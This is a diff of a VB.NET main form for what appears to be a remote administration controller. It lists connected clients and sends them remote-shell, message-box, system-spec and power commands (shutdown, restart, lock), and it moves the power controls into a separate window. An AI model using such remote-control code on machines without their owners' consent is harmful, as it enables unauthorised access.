@@ -4,6 +4,7 @@ Imports MaxMind.GeoIP2
 Imports System.IO
 Imports System.Text
 Imports System.Runtime.InteropServices
+Imports System.Windows.Forms.ListView
 
 Public Class Main
 
@@ -98,9 +99,7 @@ Public Class Main
         Second.Start()
         ErrorLabel.Text = ""
         Tabs.Visible = False
-        Tabs.SelectedTab = ManageTab
-        ShowPasswordButton.BringToFront()
-        ShowPasswordButton.Text = ""
+        Tabs.SelectedTab = CoreTab
         pf = cfr & Path.DirectorySeparatorChar & "profiles"
         Try
             Dim di As New DirectoryInfo(pf)
@@ -110,9 +109,9 @@ Public Class Main
         Catch ex As Exception
             MsgBox("Profiles folder could not be created!" & vbNewLine & ex.Message)
         End Try
-        For Each address In Dns.GetHostEntry(Dns.GetHostName).AddressList
-            WriteToLog(address.ToString)
-        Next
+        'For Each address In Dns.GetHostEntry(Dns.GetHostName).AddressList
+        '    WriteToLog(address.ToString)
+        'Next
 
         WriteToLog("Application started")
     End Sub
@@ -200,7 +199,7 @@ Public Class Main
     ''' <param name="message">Message to print</param>
     Public Sub WriteToLog(ByVal message As String)
         Dim oo = My.Computer.Clock.LocalTime
-        LogTextBox.Text += "[" & oo.Year & "/" & oo.Month & "/" & oo.Day & " " & New String(oo.Hour.ToString).PadLeft(2, "0") & ":" & New String(oo.Minute.ToString).PadLeft(2, "0") & ":" & New String(oo.Second.ToString).PadLeft(2, "0") & "] " & message & vbNewLine
+        LogTextBox.AppendText("[" & oo.Year & "/" & oo.Month & "/" & oo.Day & " " & New String(oo.Hour.ToString).PadLeft(2, "0") & ":" & New String(oo.Minute.ToString).PadLeft(2, "0") & ":" & New String(oo.Second.ToString).PadLeft(2, "0") & "] " & message & vbNewLine)
         ''TODO: scroll to bottom
     End Sub
 
@@ -288,10 +287,16 @@ Public Class Main
         End If
         Try
             Select Case A(0)
+                Case n.exception
+                    For i As Integer = 0 To L1.Items.Count - 1
+                        If L1.Items.Item(i).SubItems(1).Text = S.IP(sock) Then
+                            MsgBox(A(1), MsgBoxStyle.Critical, "Exception @ (" & L1.Items.Item(i).SubItems(0).Text & ")")
+                            Exit For
+                        End If
+                    Next
                 Case n.connect ''authentication check
                     Dim rk As Crypt.RSAResult = New Crypt.RSAResult(Convert.FromBase64String(A(1)))
                     pw(sock) = Crypt.RSA.Decrypt(rk.AsBytes, cpk).AsString
-                    PasswordTextbox.Text = pw(sock)
                     S.Send(sock, n.response & Sep & Crypt.HMACSHA512Hasher.Base64Hash(pw(sock)))
                 Case n.response ''successfully authenticated
                     trust.Add(sock)
@@ -749,14 +754,24 @@ Public Class Main
                     If My.Application.OpenForms(n.openshell & sock) Is Nothing Then Exit Sub
                     Dim shp As Shell = My.Application.OpenForms(n.openshell & sock)
                     shp.OutputTextBox.AppendText(vbNewLine & "---SESSION TERMINATED---" & vbNewLine)
+                Case n.openpower ''power options
+                    If My.Application.OpenForms(n.openpower & sock) IsNot Nothing Then Exit Sub
+                    If Me.InvokeRequired Then
+                        Dim j As New _Data(AddressOf Data)
+                        Me.Invoke(j, New Object() {sock, B})
+                        Exit Sub
+                    End If
+                    Dim pwr As New Power
+                    pwr.sock = sock
+                    pwr.Name = n.openpower & sock
+                    pwr.Text = pwr.Text & S.IP(sock)
+                    pwr.Show()
             End Select
         Catch ex As Exception
             MsgBox(ex.Message.ToString + Environment.NewLine + ex.StackTrace.ToString, MsgBoxStyle.Critical, "Error")
         End Try
 
     End Sub
-
-
 #End Region
 
     ''' <summary>
@@ -792,37 +807,7 @@ Public Class Main
         End Using
     End Function
 
-#Region "Power Buttons"
-    Private Sub ShutdownButton_Click(sender As Object, e As EventArgs) Handles ShutdownButton.Click
-        For Each x As ListViewItem In L1.SelectedItems
-            S.Send(x.ToolTipText, n.shutdown)
-        Next
-    End Sub
 
-    Private Sub RestartButton_Click(sender As Object, e As EventArgs) Handles RestartButton.Click
-        For Each x As ListViewItem In L1.SelectedItems
-            S.Send(x.ToolTipText, n.restart)
-        Next
-    End Sub
-
-    Private Sub SleepButton_Click(sender As Object, e As EventArgs) Handles SleepButton.Click
-        For Each x As ListViewItem In L1.SelectedItems
-            S.Send(x.ToolTipText, n.sleep)
-        Next
-    End Sub
-
-    Private Sub LogoutButton_Click(sender As Object, e As EventArgs) Handles LogoutButton.Click
-        For Each x As ListViewItem In L1.SelectedItems
-            S.Send(x.ToolTipText, n.logoff)
-        Next
-    End Sub
-
-    Private Sub LockButton_Click(sender As Object, e As EventArgs) Handles LockButton.Click
-        For Each x As ListViewItem In L1.SelectedItems
-            S.Send(x.ToolTipText, n.lock)
-        Next
-    End Sub
-#End Region
 
 #Region "View/Client Control Button Events"
 
@@ -870,8 +855,10 @@ Public Class Main
 
     Private Sub MsgSendButton_Click(sender As Object, e As EventArgs) Handles MsgSendButton.Click  ''Send messagebox
         Dim mbmsg As String = MsgTextbox.Text
-        Dim mbtp As String ''MsgBoxStyle
-        If InfoRadio.Checked Then mbtp = "i" Else If ExclaRadio.Checked Then mbtp = "w" Else If QuestRadio.Checked Then mbtp = "q" Else If CritRadio.Checked Then mbtp = "e"
+        ''Dim mbtp As String ''MsgBoxStyle
+        Dim mbtp As Integer ''MsgBoxStyle
+        ''If InfoRadio.Checked Then mbtp = "i" Else If ExclaRadio.Checked Then mbtp = "w" Else If QuestRadio.Checked Then mbtp = "q" Else If CritRadio.Checked Then mbtp = "e"
+        If InfoRadio.Checked Then mbtp = MessageBoxIcon.Information Else If ExclaRadio.Checked Then mbtp = MessageBoxIcon.Exclamation Else If QuestRadio.Checked Then mbtp = MessageBoxIcon.Question Else If CritRadio.Checked Then mbtp = MessageBoxIcon.Error
         For Each x As ListViewItem In L1.SelectedItems
             S.Send(x.ToolTipText, n.message & Sep & mbmsg & Sep & mbtp.ToString)
         Next
@@ -883,7 +870,7 @@ Public Class Main
         Next
     End Sub
 
-    Private Sub RetrieveButton_Click(sender As Object, e As EventArgs) Handles RetrieveButton.Click
+    Private Sub RetrieveButton_Click(sender As Object, e As EventArgs)
         For Each x As ListViewItem In L1.SelectedItems
             S.Send(x.ToolTipText, n.getspecs)
         Next
@@ -904,13 +891,19 @@ Public Class Main
             S.Send(x.ToolTipText, n.openshell)
         Next
     End Sub
+
+    Private Sub PowerButton_Click(sender As Object, e As EventArgs) Handles PowerButton.Click
+        For Each x As ListViewItem In L1.SelectedItems
+            S.Send(x.ToolTipText, n.openpower)
+        Next
+    End Sub
 #End Region
 
     Private Sub L1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles L1.SelectedIndexChanged
         If L1.SelectedItems.Count >= 1 Then
             Tabs.Enabled = True
             Tabs.Visible = True
-            CurrentClientChange(L1.SelectedItems.Item(0).SubItems(0).Text)
+            CurrentClientChange(L1.SelectedItems)
         Else
             Tabs.Enabled = False
             Tabs.Visible = False
@@ -921,36 +914,44 @@ Public Class Main
     ''' Update directory variables to current client's
     ''' </summary>
     ''' <param name="client">Client ID/Name</param>
-    Public Sub CurrentClientChange(ByVal client As String)
-        cid = client ''set cid to current client's ID
-        cidf = cfr & Path.DirectorySeparatorChar & "hosts"
-        Try
-            Dim di As New DirectoryInfo(cidf)
-            If Not di.Exists Then
-                di.Create()
+    Public Sub CurrentClientChange(ByVal client As SelectedListViewItemCollection)
+        For Each x As ListViewItem In client
+            cid = x.SubItems(0).Text ''set cid to current client's ID
+            cidf = cfr & Path.DirectorySeparatorChar & "hosts"
+            Try
+                Dim di As New DirectoryInfo(cidf)
+                If Not di.Exists Then
+                    di.Create()
+                End If
+            Catch ex As Exception
+                MsgBox("Hosts folder could not be created!" & vbNewLine & ex.Message)
+            End Try
+            cidf = cfr & Path.DirectorySeparatorChar & "hosts" & Path.DirectorySeparatorChar & cid
+            Try
+                Dim di As New DirectoryInfo(cidf)
+                If Not di.Exists Then
+                    di.Create()
+                End If
+            Catch ex As Exception
+                MsgBox("Hosts/current subfolder could not be created!" & vbNewLine & ex.Message)
+            End Try
+            HostInfoListView.Items.Clear()
+            If client.Count > 1 Then
+                HostInfoListView.Items.Add("Multiple items selected")
+            Else
+                ''PasswordTextbox.Text = pw(sock)
             End If
-        Catch ex As Exception
-            MsgBox("Hosts folder could not be created!" & vbNewLine & ex.Message)
-        End Try
-        cidf = cfr & Path.DirectorySeparatorChar & "hosts" & Path.DirectorySeparatorChar & cid
-        Try
-            Dim di As New DirectoryInfo(cidf)
-            If Not di.Exists Then
-                di.Create()
-            End If
-        Catch ex As Exception
-            MsgBox("Hosts/current subfolder could not be created!" & vbNewLine & ex.Message)
-        End Try
+        Next
     End Sub
 
     Private Sub ListenButton_Click(sender As Object, e As EventArgs) Handles ListenButton.Click
-        PasswordTextbox.BackColor = Color.Black
-        If PasswordTextbox.Text.Length = 0 Then
-            ErrorLabel.Text = "No Password!"
-            PasswordTextbox.Focus()
-            PasswordTextbox.BackColor = Color.DarkRed
-            ''Return
-        End If
+        'PasswordTextbox.BackColor = Color.Black
+        'If PasswordTextbox.Text.Length = 0 Then
+        '    ErrorLabel.Text = "No Password!"
+        '    PasswordTextbox.Focus()
+        '    PasswordTextbox.BackColor = Color.DarkRed
+        '    ''Return
+        'End If
         If ListenButton.Text = "&Start" Then
             ''pw = PasswordTextbox.Text
             Try
@@ -959,7 +960,7 @@ Public Class Main
                 Spinner.Visible = True
                 ListenButton.Text = "S&top"
                 ListenButton.BackColor = Color.Red
-                PasswordTextbox.Enabled = False
+                ProfileComboBox.Enabled = False
                 PortValue.Enabled = False
                 ErrorLabel.Text = Nothing
                 InfoLabel.Text = "Listener started"
@@ -978,7 +979,7 @@ Public Class Main
             Spinner.Visible = False
             ListenButton.Text = "&Start"
             ListenButton.BackColor = Color.Green
-            PasswordTextbox.Enabled = True
+            ProfileComboBox.Enabled = True
             PortValue.Enabled = True
             WriteToLog("Listener stopped")
         End If
@@ -1054,14 +1055,6 @@ Public Class Main
     End Sub
 #End Region
 
-    Private Sub ShowPasswordButton_MouseDown(sender As Object, e As MouseEventArgs)
-        PasswordTextbox.UseSystemPasswordChar = False
-    End Sub
-
-    Private Sub ShowPasswordButton_MouseUp(sender As Object, e As MouseEventArgs)
-        PasswordTextbox.UseSystemPasswordChar = True
-    End Sub
-
     Private Sub CopyToClipboardToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CopyToClipboardToolStripMenuItem.Click
         Dim ars As Integer = 0
         For Each x As ListViewItem In L1.SelectedItems
@@ -1088,4 +1081,18 @@ Public Class Main
         End If
 
     End Sub
+
+    Private Sub PluginListView_DoubleClick(sender As Object, e As EventArgs) Handles PluginListView.DoubleClick
+        For Each x As ListViewItem In PluginListView.SelectedItems
+
+        Next
+    End Sub
+
+    Private Sub PluginListView_KeyPress(sender As Object, e As KeyPressEventArgs) Handles PluginListView.KeyPress
+        If e.KeyChar = ChrW(Keys.Return) Then
+            PluginListView_DoubleClick(sender, e)
+        End If
+    End Sub
+
+
 End Class
